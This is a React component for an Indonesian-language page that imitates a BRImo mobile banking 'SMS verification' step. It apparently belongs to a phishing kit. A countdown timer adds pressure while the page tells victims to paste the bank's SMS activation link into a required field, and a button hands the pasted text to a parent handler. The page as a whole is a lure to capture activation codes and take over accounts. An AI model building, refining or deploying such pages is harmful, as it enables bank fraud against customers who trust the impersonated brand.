
import React from 'react'
import Countdown, {zeroPad} from 'react-countdown';

const SiteVerifikasi = ({btnClick}) => {
   
  const handleClick = (e) => {
    e.preventDefault()
    const data = {
      message: document.getElementById('msg').value,
    }
    btnClick(data)
  }

  const renderer = ({ hours, minutes, seconds, completed }) => {
    if (completed) {
      return <span>{zeroPad(minutes)}:{zeroPad(seconds)}</span>;
    } else {
      return <span>{zeroPad(minutes)}:{zeroPad(seconds)}</span>;
    }
  }
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000', marginTop:'2em'}}>  
        <h1 style={{textAlign:'center', fontWeight:'bold',color:'rgb(14 120 202)', fontSize:'1.5em'}}>Cek SMS</h1>            
        <div style={{background:'grey', width:'100%', height:'1px', marginTop:'1em'}}></div>
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em', color:'rgb(14 120 202)', fontSize:'1.5em'}}>
        <Countdown
          date={Date.now() + 60*3000}
          autoStart={true}
          renderer={renderer}
        />
        </h1>    
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link untuk Aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan lalu tempel dibawah ini</h1>    
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Tempel SMS BRI (Wajib)</h1>    
        <form>
            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=xxxx"></textarea>
            <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
              Konfirmasi
            </button>
        </form>
    </div>
  )
}

export default SiteVerifikasi